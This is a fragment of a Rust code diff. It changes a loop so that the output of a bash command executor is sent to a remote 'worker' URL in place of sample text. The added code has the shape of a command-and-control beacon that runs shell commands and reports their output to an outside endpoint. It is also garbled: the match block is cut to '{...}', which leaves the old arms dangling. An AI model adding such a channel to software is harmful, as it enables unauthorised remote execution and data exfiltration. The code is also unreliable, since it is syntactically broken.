@@ -7,7 +7,9 @@ async fn main() {
 
     loop {
         // Send data to the Worker
-        let response = match worker_communication::send_data_request(&worker_url, "Sample data").await {
+        let command_output = command_executor::execute_bash_command(true);  
+let response = match worker_communication::send_data_request(&worker_url, &command_output).await {...}  
+
             Ok(response) => response,
             Err(e) => {
                 println!("Error: {}", e);
